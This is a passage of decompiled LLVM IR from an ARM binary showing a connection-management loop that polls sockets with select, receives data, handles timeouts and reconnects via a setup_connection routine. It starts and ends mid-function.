dec_label_pc_ed48:                                ; preds = %dec_label_pc_ed30, %dec_label_pc_ecc8, %dec_label_pc_ebf4, %dec_label_pc_ebc0, %dec_label_pc_ed48.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_ed68513 = load i32, i32* @sp, align 4
  %v3_ed68514 = add i32 %v2_ed68513, 1676
  %v4_ed68515 = inttoptr i32 %v3_ed68514 to i32*
  store i32 0, i32* %v4_ed68515, align 4
  br label %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge

dec_label_pc_ed54.dec_label_pc_ed54_crit_edge:    ; preds = %dec_label_pc_ed48, %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge
  %v0_ed54.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ed58 = add i32 %v0_ed54.pre, 4
  store i32 %v1_ed58, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ed60 = add i32 %v0_ed54.pre, 1672
  store i32 %v1_ed60, i32* %ip.global-to-local, align 4
  %v7_ed64 = icmp eq i32 %v1_ed58, 128
  %v2_ed68 = load i32, i32* @sp, align 4
  %v3_ed68 = add i32 %v2_ed68, %v1_ed60
  %v4_ed68 = inttoptr i32 %v3_ed68 to i32*
  store i32 0, i32* %v4_ed68, align 4
  br i1 %v7_ed64, label %dec_label_pc_ed70, label %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge

dec_label_pc_ed70:                                ; preds = %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed70 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ed70, i32* %stack_var_-352, align 4
  %v1_ed7c516 = add i32 %v0_ed70, 8
  store i32 %v1_ed7c516, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed84517 = add i32 %v0_ed70, 1548
  store i32 %v1_ed84517, i32* @lr, align 4
  %v7_ed88518 = icmp eq i32 %v1_ed7c516, 128
  %v2_ed8c519 = load i32, i32* @sp, align 4
  %v3_ed8c520 = add i32 %v2_ed8c519, %v1_ed84517
  %v4_ed8c521 = inttoptr i32 %v3_ed8c520 to i32*
  store i32 0, i32* %v4_ed8c521, align 4
  br i1 %v7_ed88518, label %dec_label_pc_ed94, label %dec_label_pc_ed78.dec_label_pc_ed78_crit_edge

dec_label_pc_ed78.dec_label_pc_ed78_crit_edge:    ; preds = %dec_label_pc_ed70, %dec_label_pc_ed78.dec_label_pc_ed78_crit_edge
  %v0_ed78.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ed7c = add i32 %v0_ed78.pre, 4
  store i32 %v1_ed7c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed84 = add i32 %v0_ed78.pre, 1544
  store i32 %v1_ed84, i32* @lr, align 4
  %v7_ed88 = icmp eq i32 %v1_ed7c, 128
  %v2_ed8c = load i32, i32* @sp, align 4
  %v3_ed8c = add i32 %v2_ed8c, %v1_ed84
  %v4_ed8c = inttoptr i32 %v3_ed8c to i32*
  store i32 0, i32* %v4_ed8c, align 4
  br i1 %v7_ed88, label %dec_label_pc_ed94, label %dec_label_pc_ed78.dec_label_pc_ed78_crit_edge

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ed78.dec_label_pc_ed78_crit_edge, %dec_label_pc_ed70
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed94 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ed94, i32* @r6, align 4
  store i32 %v0_ed94, i32* @r5, align 4
  store i32 %v0_ed94, i32* %stack_var_-52, align 4
  br label %dec_label_pc_edf0

dec_label_pc_eda4:                                ; preds = %dec_label_pc_ee20
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ee0c, i1* %cpsr_z.global-to-local, align 1
  %v1_ee90 = add i32 %v2_ee04, 4
  %v2_ee90 = inttoptr i32 %v1_ee90 to i32*
  %v3_ee90 = load i32, i32* %v2_ee90, align 4
  br i1 %v7_ee0c, label %dec_label_pc_ee90, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %dec_label_pc_eda4
  store i32 %v3_ee90, i32* %ip.global-to-local, align 4
  %v3_edb0 = udiv i32 %v3_ee90, 32
  store i32 %v2_ee9c, i32* %r0.global-to-local, align 4
  %v3_edb8 = mul nuw nsw i32 %v3_edb0, 4
  %v2_edbc = add i32 %v3_edb8, %v2_ee9c
  store i32 %v2_edbc, i32* %r3.global-to-local, align 4
  %v1_edc0 = add i32 %v2_edbc, -184
  %v2_edc0 = inttoptr i32 %v1_edc0 to i32*
  %v3_edc0 = load i32, i32* %v2_edc0, align 4
  %v1_edc4 = urem i32 %v3_ee90, 32
  store i32 %v1_edc4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_edcc = shl i32 1, %v1_edc4
  %v8_edcc = or i32 %v3_edc0, %v7_edcc
  store i32 %v8_edcc, i32* %r2.global-to-local, align 4
  store i32 %v8_edcc, i32* %v2_edc0, align 4
  %v0_edd4 = load i32, i32* @r6, align 4
  %v1_edd4 = load i32, i32* %ip.global-to-local, align 4
  %v3_edd4 = icmp uge i32 %v0_edd4, %v1_edd4
  store i1 %v3_edd4, i1* %cpsr_c.global-to-local, align 1
  %v9_edd4 = icmp eq i32 %v0_edd4, %v1_edd4
  store i1 %v9_edd4, i1* %cpsr_z.global-to-local, align 1
  %v5_edd8 = icmp slt i32 %v0_edd4, %v1_edd4
  br i1 %v5_edd8, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_edac
  store i32 %v1_edd4, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread75, %bb416, %bb414, %bb418, %dec_label_pc_ee84, %dec_label_pc_edac, %bb409
  %v3_eddc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_eddc, i32* %r3.global-to-local, align 4
  %v1_ede0 = add i32 %v3_eddc, 1
  store i32 %v1_ede0, i32* %r2.global-to-local, align 4
  %v2_ede4 = icmp ugt i32 %v1_ede0, 254
  store i1 %v2_ede4, i1* %cpsr_c.global-to-local, align 1
  %v7_ede4 = icmp eq i32 %v1_ede0, 255
  store i1 %v7_ede4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ede0, i32* %stack_var_-52, align 4
  %v8_edec = icmp sgt i32 %v1_ede0, 255
  br i1 %v8_edec, label %dec_label_pc_eec0, label %dec_label_pc_edf0

dec_label_pc_edf0:                                ; preds = %bb410, %dec_label_pc_ed94
  %v0_edfc = phi i32 [ %v1_ede0, %bb410 ], [ %v0_ed94, %dec_label_pc_ed94 ]
  store i32 ptrtoint (i32* @global_var_24748.151 to i32), i32* %r0.global-to-local, align 4
  %v3_edf4 = mul i32 %v0_edfc, 256
  store i32 %v3_edf4, i32* %r3.global-to-local, align 4
  %v2_edf8 = load i32, i32* @global_var_24748.151, align 4
  store i32 %v2_edf8, i32* @r1, align 4
  %v2_ee00 = mul i32 %v0_edfc, 288
  store i32 %v2_ee00, i32* %r2.global-to-local, align 4
  %v2_ee04 = add i32 %v2_edf8, %v2_ee00
  store i32 %v2_ee04, i32* @r4, align 4
  %v1_ee08 = add i32 %v2_ee04, 12
  %v2_ee08 = inttoptr i32 %v1_ee08 to i32*
  %v3_ee08 = load i32, i32* %v2_ee08, align 4
  store i32 %v3_ee08, i32* %ip.global-to-local, align 4
  %v2_ee0c = icmp ne i32 %v3_ee08, 0
  store i1 %v2_ee0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee0c = icmp eq i32 %v3_ee08, 1
  store i1 %v7_ee0c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee10 = xor i1 %v2_ee0c, true
  %v3_ee10 = or i1 %v7_ee0c, %v2_ee10
  br i1 %v3_ee10, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_edf0
  store i32 5, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_edf0, %bb411
  %v1_ee30215 = phi i32 [ %v2_edf8, %dec_label_pc_edf0 ], [ 5, %bb411 ]
  %v2_ee14 = xor i1 %v7_ee0c, true
  %v3_ee14 = and i1 %v2_ee0c, %v2_ee14
  br i1 %v3_ee14, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* @r1, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_ee30 = phi i32 [ %v1_ee30215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee18 = icmp eq i32 %v3_ee08, 0
  store i1 %v2_ee18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee18, label %bb410, label %dec_label_pc_ee20

dec_label_pc_ee20:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_21c64.139 to i32), i32* %r2.global-to-local, align 4
  %v2_ee24 = load i32, i32* @global_var_21c64.139, align 4
  store i32 %v2_ee24, i32* %r3.global-to-local, align 4
  %v1_ee28 = add i32 %v2_ee04, 8
  %v2_ee28 = inttoptr i32 %v1_ee28 to i32*
  %v3_ee28 = load i32, i32* %v2_ee28, align 4
  store i32 %v3_ee28, i32* %r2.global-to-local, align 4
  %v2_ee2c = sub i32 %v2_ee24, %v3_ee28
  store i32 %v2_ee2c, i32* %r3.global-to-local, align 4
  %v3_ee30 = icmp uge i32 %v2_ee2c, %v1_ee30
  store i1 %v3_ee30, i1* %cpsr_c.global-to-local, align 1
  %v9_ee30 = icmp eq i32 %v2_ee2c, %v1_ee30
  store i1 %v9_ee30, i1* %cpsr_z.global-to-local, align 1
  %v2_ee34 = xor i1 %v3_ee30, true
  %v3_ee34 = or i1 %v9_ee30, %v2_ee34
  br i1 %v3_ee34, label %dec_label_pc_eda4, label %dec_label_pc_ee38

dec_label_pc_ee38:                                ; preds = %dec_label_pc_ee20
  %v1_ee38 = add i32 %v2_ee04, 4
  %v2_ee38 = inttoptr i32 %v1_ee38 to i32*
  %v3_ee38 = load i32, i32* %v2_ee38, align 4
  store i32 %v3_ee38, i32* %r0.global-to-local, align 4
  %v1_ee3c = call i32 @__GI___libc_close(i32 %v3_ee38)
  store i32 %v1_ee3c, i32* %r0.global-to-local, align 4
  %v0_ee40 = load i32, i32* @r4, align 4
  %v1_ee40 = add i32 %v0_ee40, 12
  %v2_ee40 = inttoptr i32 %v1_ee40 to i32*
  %v3_ee40 = load i32, i32* %v2_ee40, align 4
  store i32 %v3_ee40, i32* %r3.global-to-local, align 4
  %v2_ee44 = icmp ugt i32 %v3_ee40, 1
  store i1 %v2_ee44, i1* %cpsr_c.global-to-local, align 1
  %v7_ee44 = icmp eq i32 %v3_ee40, 2
  store i1 %v7_ee44, i1* %cpsr_z.global-to-local, align 1
  %v2_ee48 = xor i1 %v2_ee44, true
  %v3_ee48 = or i1 %v7_ee44, %v2_ee48
  br i1 %v3_ee48, label %bb415, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_ee38
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee50298302 = add i32 %v0_ee40, 4
  %v3_ee50299303 = inttoptr i32 %v2_ee50298302 to i32*
  store i32 -1, i32* %v3_ee50299303, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_ee38
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee50295 = add i32 %v0_ee40, 4
  %v3_ee50296 = inttoptr i32 %v2_ee50295 to i32*
  store i32 -1, i32* %v3_ee50296, align 4
  %v4_ee54 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee54 = load i32, i32* @r4, align 4
  %v6_ee54 = add i32 %v5_ee54, 12
  %v7_ee54 = inttoptr i32 %v6_ee54 to i32*
  store i32 %v4_ee54, i32* %v7_ee54, align 4
  %v4_ee58 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee58 = trunc i32 %v4_ee58 to i8
  %v6_ee58 = load i32, i32* @r4, align 4
  %v7_ee58 = add i32 %v6_ee58, 284
  %v8_ee58 = inttoptr i32 %v7_ee58 to i8*
  store i8 %v5_ee58, i8* %v8_ee58, align 1
  %v0_ee5c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ee5c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread301, %bb415
  %v1_ee5c = phi i1 [ %v1_ee5c.pre, %bb415 ], [ %v2_ee44, %.thread301 ]
  %v0_ee5c = phi i1 [ %v0_ee5c.pre, %bb415 ], [ false, %.thread301 ]
  %v2_ee5c = xor i1 %v1_ee5c, true
  %v3_ee5c = or i1 %v0_ee5c, %v2_ee5c
  br i1 %v3_ee5c, label %bb410, label %dec_label_pc_ee60

dec_label_pc_ee60:                                ; preds = %bb416
  %v0_ee60 = load i32, i32* @r4, align 4
  %v1_ee60 = add i32 %v0_ee60, 284
  %v2_ee60 = inttoptr i32 %v1_ee60 to i8*
  %v3_ee60 = load i8, i8* %v2_ee60, align 1
  %v4_ee60 = zext i8 %v3_ee60 to i32
  %v1_ee64 = add nuw nsw i32 %v4_ee60, 1
  %v1_ee68 = urem i32 %v1_ee64, 256
  store i32 %v1_ee68, i32* %r3.global-to-local, align 4
  %v2_ee6c = icmp ugt i32 %v1_ee68, 9
  store i1 %v2_ee6c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee6c = icmp eq i32 %v1_ee68, 10
  store i1 %v7_ee6c, i1* %cpsr_z.global-to-local, align 1
  %v1_ee70 = trunc i32 %v1_ee64 to i8
  store i8 %v1_ee70, i8* %v2_ee60, align 1
  %v0_ee74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee74, label %.thread75, label %dec_label_pc_ee84

.thread75:                                        ; preds = %dec_label_pc_ee60
  %v1_ee74 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee74 = add i32 %v1_ee74, -10
  store i32 %v2_ee74, i32* %r3.global-to-local, align 4
  %v2_ee78 = load i32, i32* @r4, align 4
  %v3_ee78 = add i32 %v2_ee78, 12
  %v4_ee78 = inttoptr i32 %v3_ee78 to i32*
  store i32 %v2_ee74, i32* %v4_ee78, align 4
  %v1_ee7c = load i32, i32* %r3.global-to-local, align 4
  %v2_ee7c = trunc i32 %v1_ee7c to i8
  %v3_ee7c = load i32, i32* @r4, align 4
  %v4_ee7c = add i32 %v3_ee7c, 284
  %v5_ee7c = inttoptr i32 %v4_ee7c to i8*
  store i8 %v2_ee7c, i8* %v5_ee7c, align 1
  %v0_ee80.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee80.pr.pr, label %bb410, label %dec_label_pc_ee84

dec_label_pc_ee84:                                ; preds = %dec_label_pc_ee60, %.thread75
  %v0_ee84 = load i32, i32* @r4, align 4
  store i32 %v0_ee84, i32* @r0, align 4
  %v0_ee88 = call i32 @setup_connection()
  store i32 %v0_ee88, i32* %r0.global-to-local, align 4
  br label %bb410

dec_label_pc_ee90:                                ; preds = %dec_label_pc_eda4
  store i32 %v3_ee90, i32* %r0.global-to-local, align 4
  %v3_ee94 = udiv i32 %v3_ee90, 32
  %v3_ee98 = mul nuw nsw i32 %v3_ee94, 4
  store i32 %v2_ee9c, i32* @lr, align 4
  %v2_eea0 = add i32 %v3_ee98, %v2_ee9c
  store i32 %v2_eea0, i32* %r3.global-to-local, align 4
  %v1_eea4 = add i32 %v2_eea0, -312
  %v2_eea4 = inttoptr i32 %v1_eea4 to i32*
  %v3_eea4 = load i32, i32* %v2_eea4, align 4
  %v1_eea8 = urem i32 %v3_ee90, 32
  store i32 %v1_eea8, i32* %r1.global-to-local, align 4
  %v7_eeac = shl i32 1, %v1_eea8
  %v8_eeac = or i32 %v3_eea4, %v7_eeac
  store i32 %v8_eeac, i32* %r2.global-to-local, align 4
  %v0_eeb0 = load i32, i32* @r5, align 4
  %v3_eeb0 = icmp uge i32 %v0_eeb0, %v3_ee90
  store i1 %v3_eeb0, i1* %cpsr_c.global-to-local, align 1
  %v9_eeb0 = icmp eq i32 %v0_eeb0, %v3_ee90
  store i1 %v9_eeb0, i1* %cpsr_z.global-to-local, align 1
  %v5_eeb4 = icmp slt i32 %v0_eeb0, %v3_ee90
  br i1 %v5_eeb4, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_ee90
  store i32 %v3_ee90, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_ee90, %bb417
  store i32 %v8_eeac, i32* %v2_eea4, align 4
  br label %bb410

dec_label_pc_eec0:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_eecc = load i32, i32* @r5, align 4
  %v1_eecc = load i32, i32* @r6, align 4
  %v3_eecc = icmp uge i32 %v0_eecc, %v1_eecc
  store i1 %v3_eecc, i1* %cpsr_c.global-to-local, align 1
  %v9_eecc = icmp eq i32 %v0_eecc, %v1_eecc
  store i1 %v9_eecc, i1* %cpsr_z.global-to-local, align 1
  %v5_eed0 = icmp slt i32 %v0_eecc, %v1_eecc
  %storemerge155 = select i1 %v5_eed0, i32 %v1_eecc, i32 %v0_eecc
  store i32 %v2_eee4, i32* %ip.global-to-local, align 4
  store i32 %v2_eee8, i32* %r1.global-to-local, align 4
  store i32 %v2_eeec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_eef4 = add i32 %storemerge155, 1
  store i32 %v1_eef4, i32* %r0.global-to-local, align 4
  %v5_ef00 = call i32 @__libc_select(i32 %v1_eef4, i32 %v2_eee8, i32 %v2_eeec, i32 0, i32 %v2_eee4)
  %v0_ef04 = load i32, i32* @r4, align 4
  store i32 %v0_ef04, i32* %r0.global-to-local, align 4
  %v1_ef08 = inttoptr i32 %v0_ef04 to i32*
  %v2_ef08 = call i32 @__GI_time(i32* %v1_ef08)
  store i32 %v2_ef08, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c64.139 to i32), i32* @lr, align 4
  %v0_ef10 = load i32, i32* @r4, align 4
  store i32 %v0_ef10, i32* %stack_var_-52, align 4
  store i32 %v2_ef08, i32* @global_var_21c64.139, align 4
  br label %dec_label_pc_ef18

dec_label_pc_ef18:                                ; preds = %dec_label_pc_f080, %dec_label_pc_eec0
  %v0_ef24 = phi i32 [ %v1_f084, %dec_label_pc_f080 ], [ %v0_ef10, %dec_label_pc_eec0 ]
  store i32 ptrtoint (i32* @global_var_24748.151 to i32), i32* %r0.global-to-local, align 4
  %v3_ef1c = mul i32 %v0_ef24, 256
  store i32 %v3_ef1c, i32* %r3.global-to-local, align 4
  %v2_ef20 = load i32, i32* @global_var_24748.151, align 4
  store i32 %v2_ef20, i32* %r1.global-to-local, align 4
  %v2_ef28 = mul i32 %v0_ef24, 288
  store i32 %v2_ef28, i32* %r2.global-to-local, align 4
  %v2_ef2c = add i32 %v2_ef20, %v2_ef28
  store i32 %v2_ef2c, i32* @r6, align 4
  %v1_ef30 = add i32 %v2_ef2c, 4
  %v2_ef30 = inttoptr i32 %v1_ef30 to i32*
  %v3_ef30 = load i32, i32* %v2_ef30, align 4
  store i32 %v3_ef30, i32* %r0.global-to-local, align 4
  %v2_ef34 = icmp eq i32 %v3_ef30, -1
  store i1 %v2_ef34, i1* %cpsr_c.global-to-local, align 1
  %v7_ef34 = icmp eq i32 %v3_ef30, -1
  store i1 %v7_ef34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef34, label %dec_label_pc_f080, label %dec_label_pc_ef3c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ef18
  %v3_ef3c = udiv i32 %v3_ef30, 32
  store i32 %v2_ee9c, i32* %r1.global-to-local, align 4
  %v3_ef44 = mul nuw nsw i32 %v3_ef3c, 4
  store i32 %v3_ef44, i32* @ip, align 4
  %v2_ef48 = add i32 %v3_ef44, %v2_ee9c
  store i32 %v2_ef48, i32* %r2.global-to-local, align 4
  %v1_ef4c = add i32 %v2_ef48, -312
  %v2_ef4c = inttoptr i32 %v1_ef4c to i32*
  %v3_ef4c = load i32, i32* %v2_ef4c, align 4
  %v1_ef50 = urem i32 %v3_ef30, 32
  store i32 %v1_ef50, i32* %r1.global-to-local, align 4
  %v2_ef54 = add nsw i32 %v1_ef50, -1
  %v3_ef54 = shl i32 1, %v2_ef54
  %v4_ef54 = and i32 %v3_ef4c, %v3_ef54
  %v5_ef54 = icmp ne i32 %v4_ef54, 0
  store i1 %v5_ef54, i1* %cpsr_c.global-to-local, align 1
  %v6_ef54 = ashr i32 %v3_ef4c, %v1_ef50
  store i32 %v6_ef54, i32* %r3.global-to-local, align 4
  %v1_ef58 = urem i32 %v6_ef54, 2
  %v2_ef58 = icmp eq i32 %v1_ef58, 0
  store i1 %v2_ef58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef58, label %dec_label_pc_ef60, label %dec_label_pc_fa88

dec_label_pc_ef60:                                ; preds = %dec_label_pc_ef3c, %dec_label_pc_fb34
  %v1_ef6c = phi i32 [ %v1_ef50, %dec_label_pc_ef3c ], [ %v1_ef6c.pre, %dec_label_pc_fb34 ]
  %v0_ef64 = phi i32 [ %v3_ef44, %dec_label_pc_ef3c ], [ %v0_ef64.pre, %dec_label_pc_fb34 ]
  store i32 %v2_ee9c, i32* @lr, align 4
  %v2_ef64 = add i32 %v0_ef64, %v2_ee9c
  store i32 %v2_ef64, i32* %r2.global-to-local, align 4
  %v1_ef68 = add i32 %v2_ef64, -184
  %v2_ef68 = inttoptr i32 %v1_ef68 to i32*
  %v3_ef68 = load i32, i32* %v2_ef68, align 4
  %v2_ef6c = add i32 %v1_ef6c, -1
  %v3_ef6c = shl i32 1, %v2_ef6c
  %v4_ef6c = and i32 %v3_ef68, %v3_ef6c
  %v5_ef6c = icmp ne i32 %v4_ef6c, 0
  store i1 %v5_ef6c, i1* %cpsr_c.global-to-local, align 1
  %v6_ef6c = ashr i32 %v3_ef68, %v1_ef6c
  store i32 %v6_ef6c, i32* %r3.global-to-local, align 4
  %v1_ef70 = urem i32 %v6_ef6c, 2
  %v2_ef70 = icmp eq i32 %v1_ef70, 0
  store i1 %v2_ef70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef70, label %dec_label_pc_f080, label %dec_label_pc_ef78.preheader

dec_label_pc_ef78.preheader:                      ; preds = %dec_label_pc_ef60
  %v0_ef78176 = load i32, i32* @r6, align 4
  %v1_ef78177 = add i32 %v0_ef78176, 12
  %v2_ef78178 = inttoptr i32 %v1_ef78177 to i32*
  %v3_ef78179 = load i32, i32* %v2_ef78178, align 4
  store i32 %v3_ef78179, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef7c175181 = icmp eq i32 %v3_ef78179, 0
  store i1 %v2_ef7c175181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef7c175181, label %dec_label_pc_f080, label %dec_label_pc_ef84.lr.ph

dec_label_pc_ef78.loopexit:                       ; preds = %dec_label_pc_f98c, %dec_label_pc_f790
  %v0_ef78 = load i32, i32* @r6, align 4
  %v1_ef78 = add i32 %v0_ef78, 12
  %v2_ef78 = inttoptr i32 %v1_ef78 to i32*
  %v3_ef78 = load i32, i32* %v2_ef78, align 4
  store i32 %v3_ef78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef7c175 = icmp eq i32 %v3_ef78, 0
  store i1 %v2_ef7c175, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef7c175, label %dec_label_pc_f080, label %dec_label_pc_ef84.lr.ph

dec_label_pc_ef84.lr.ph:                          ; preds = %dec_label_pc_ef78.preheader, %dec_label_pc_ef78.loopexit
  %v0_ef84231 = phi i32 [ %v0_ef78, %dec_label_pc_ef78.loopexit ], [ %v0_ef78176, %dec_label_pc_ef78.preheader ]
  br label %dec_label_pc_ef84

dec_label_pc_ef84:                                ; preds = %dec_label_pc_ef7c.backedge.thread, %dec_label_pc_ef7c.backedge, %dec_label_pc_ef7c.backedge.thread561, %dec_label_pc_ef84.lr.ph
  %v0_fa58 = phi i32 [ %v0_ef84231, %dec_label_pc_ef84.lr.ph ], [ %v0_ef84228, %dec_label_pc_ef7c.backedge ], [ %v0_eff8, %dec_label_pc_ef7c.backedge.thread ], [ %v0_eff8, %dec_label_pc_ef7c.backedge.thread561 ]
  %v1_ef84 = add i32 %v0_fa58, 24
  %v2_ef84 = inttoptr i32 %v1_ef84 to i32*
  %v3_ef84 = load i32, i32* %v2_ef84, align 4
  store i32 %v3_ef84, i32* @r3, align 4
  %v2_ef88 = icmp ugt i32 %v3_ef84, 255
  store i1 %v2_ef88, i1* %cpsr_c.global-to-local, align 1
  %v7_ef88 = icmp eq i32 %v3_ef84, 256
  store i1 %v7_ef88, i1* %cpsr_z.global-to-local, align 1
  %.pre282 = add i32 %v0_fa58, 28
  store i32 %.pre282, i32* @sb, align 4
  br i1 %v7_ef88, label %dec_label_pc_fa58, label %dec_label_pc_ef94

dec_label_pc_ef94:                                ; preds = %dec_label_pc_ef84, %dec_label_pc_fa58
  store i32 0, i32* @r5, align 4
  %v1_ef98 = load i32, i32* @fp, align 4
  %v2_ef98 = inttoptr i32 %v1_ef98 to i32*
  store i32 0, i32* %v2_ef98, align 4
  %v0_ef9c = load i32, i32* @r6, align 4
  %v1_ef9c = add i32 %v0_ef9c, 24
  %v2_ef9c = inttoptr i32 %v1_ef9c to i32*
  %v3_ef9c = load i32, i32* %v2_ef9c, align 4
  store i32 %v3_ef9c, i32* %r2.global-to-local, align 4
  %v0_efa0 = load i32, i32* @sb, align 4
  %v2_efa0 = add i32 %v0_efa0, %v3_ef9c
  store i32 %v2_efa0, i32* @r4, align 4
  %v1_efa4 = add i32 %v0_ef9c, 4
  %v2_efa4 = inttoptr i32 %v1_efa4 to i32*
  %v3_efa4 = load i32, i32* %v2_efa4, align 4
  store i32 %v3_efa4, i32* %r0.global-to-local, align 4
  %v1_efa8 = sub i32 256, %v3_ef9c
  store i32 %v1_efa8, i32* %r2.global-to-local, align 4
  store i32 %v2_efa0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_efb4 = call i32 @__libc_recv(i32 %v3_efa4, i32 %v2_efa0, i32 %v1_efa8, i32 16384)
  store i32 %v4_efb4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efb8 = icmp eq i32 %v4_efb4, 0
  store i1 %v2_efb8, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_efb4, 1
  br i1 %tmp419, label %dec_label_pc_f030, label %dec_label_pc_efc0

dec_label_pc_efc0:                                ; preds = %dec_label_pc_ef94
  %v0_efc0 = load i32, i32* @r5, align 4
  store i32 %v0_efc0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_efc4

dec_label_pc_efc4:                                ; preds = %.thread82, %dec_label_pc_efc0
  %v3_efd0 = phi i32 [ %v1_efd4, %.thread82 ], [ %v0_efc0, %dec_label_pc_efc0 ]
  %v1_efc4 = load i32, i32* @r4, align 4
  %v2_efc4 = add i32 %v1_efc4, %v3_efd0
  %v3_efc4 = inttoptr i32 %v2_efc4 to i8*
  %v4_efc4 = load i8, i8* %v3_efc4, align 1
  %v6_efc4 = zext i8 %v4_efc4 to i32
  store i32 %v6_efc4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efc8 = icmp eq i8 %v4_efc4, 0
  store i1 %v2_efc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_efc8, label %bb420, label %.thread82

bb420:                                            ; preds = %dec_label_pc_efc4
  %v2_efcc = add nuw nsw i32 %v6_efc4, 65
  store i32 %v2_efcc, i32* %r3.global-to-local, align 4
  %v2_efd0 = trunc i32 %v2_efcc to i8
  store i8 %v2_efd0, i8* %v3_efc4, align 1
  %v0_efd4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread82

.thread82:                                        ; preds = %dec_label_pc_efc4, %bb420
  %v0_efd4 = phi i32 [ %v3_efd0, %dec_label_pc_efc4 ], [ %v0_efd4.pre, %bb420 ]
  %v1_efd4 = add i32 %v0_efd4, 1
  store i32 %v1_efd4, i32* %r2.global-to-local, align 4
  %v3_efd8 = icmp uge i32 %v1_efd4, %v4_efb4
  store i1 %v3_efd8, i1* %cpsr_c.global-to-local, align 1
  %v9_efd8 = icmp eq i32 %v1_efd4, %v4_efb4
  store i1 %v9_efd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efd8, label %dec_label_pc_efe0, label %dec_label_pc_efc4

dec_label_pc_efe0:                                ; preds = %.thread82, %dec_label_pc_f034
  store i32 ptrtoint (i32* @global_var_21c64.139 to i32), i32* %r1.global-to-local, align 4
  %v0_efe4 = load i32, i32* @r6, align 4
  %v1_efe4 = add i32 %v0_efe4, 24
  %v2_efe4 = inttoptr i32 %v1_efe4 to i32*
  %v3_efe4 = load i32, i32* %v2_efe4, align 4
  %v2_efe8 = load i32, i32* @global_var_21c64.139, align 4
  store i32 %v2_efe8, i32* %r2.global-to-local, align 4
  %v2_efec = add i32 %v3_efe4, %v4_efb4
  store i32 %v2_efec, i32* %r3.global-to-local, align 4
  store i32 %v2_efec, i32* %v2_efe4, align 4
  %v0_eff4 = load i32, i32* %r2.global-to-local, align 4
  %v1_eff4 = load i32, i32* @r6, align 4
